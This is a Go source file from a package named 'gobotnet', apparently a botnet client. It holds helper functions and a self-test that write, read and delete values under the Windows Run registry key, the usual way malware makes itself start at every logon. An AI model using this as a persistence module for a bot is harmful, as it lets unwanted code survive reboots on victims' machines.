package gobotnet

import (
	"golang.org/x/sys/windows/registry"
)

func RegistryTest() {
	value, err := GetRegistryKeyValue(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, "test")
	if err == nil {
		OutMessage("GetRegistryKeyValue: NOT")
	}

	WriteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, "test", "test_value")
	value, err = GetRegistryKeyValue(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, "test")
	if err != nil || value != "test_value" {
		OutMessage("WriteRegistryKey: NOT")
	}

	DeleteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, "test")
	value, err = GetRegistryKeyValue(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, "test")
	if err == nil || value == "test_value" {
		OutMessage(value)
		OutMessage(err.Error())
		OutMessage("DeleteRegistryKey: NOT")
	}
}

func GetRegistryKey(typeReg registry.Key, regPath string, access uint32) (key registry.Key, err error) {
	currentKey, err := registry.OpenKey(typeReg, regPath, access)
	return currentKey, err
}

func GetRegistryKeyValue(typeReg registry.Key, regPath, nameKey string) (value string, err error) {
	key, err := GetRegistryKey(typeReg, regPath, registry.READ)
	if err != nil {
		return "", err
	}
	defer key.Close()

	value, _, err = key.GetStringValue(nameKey)
	if err != nil {
		return "", err
	}
	return value, nil
}

func IsValueSetRegistryKey(typeReg registry.Key, regPath, nameValue string) error {
	currentKey, err := GetRegistryKey(typeReg, regPath, registry.READ)
	if err != nil {
		return err
	}
	defer currentKey.Close()

	_, _, err = currentKey.GetStringValue(nameValue)
	return err
}

func WriteRegistryKey(typeReg registry.Key, regPath, nameProgram, pathToExecFile string) error {
	updateKey, err := GetRegistryKey(typeReg, regPath, registry.WRITE)
	if err != nil {
		return err
	}
	defer updateKey.Close()
	return updateKey.SetStringValue(nameProgram, pathToExecFile)
}

func DeleteRegistryKey(typeReg registry.Key, regPath, nameProgram string) error {
	deleteKey, err := GetRegistryKey(typeReg, regPath, registry.WRITE)
	if err != nil {
		return err
	}
	defer deleteKey.Close()
	return deleteKey.DeleteValue(nameProgram)
}
